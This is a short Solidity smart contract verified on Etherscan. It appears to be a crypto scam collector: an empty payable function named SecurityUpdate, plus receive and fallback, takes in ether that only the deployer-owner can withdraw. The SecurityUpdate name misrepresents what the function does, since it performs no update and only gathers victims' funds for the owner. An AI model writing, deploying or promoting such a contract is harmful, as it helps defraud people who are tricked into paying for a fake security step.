/**
 *Submitted for verification at Etherscan.io on 2023-10-04
*/

pragma solidity 0.8.15;

contract SandBox {
    address private owner;
    string data;

    constructor() {
        owner = msg.sender;
    }

    function getOwner() public view returns (address) {
        return owner;
    }

    function withdraw() public {
        require(owner == msg.sender);
        payable(msg.sender).transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {}

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    receive() external payable {
        
    }
    
    fallback() external payable { 
        
    }
}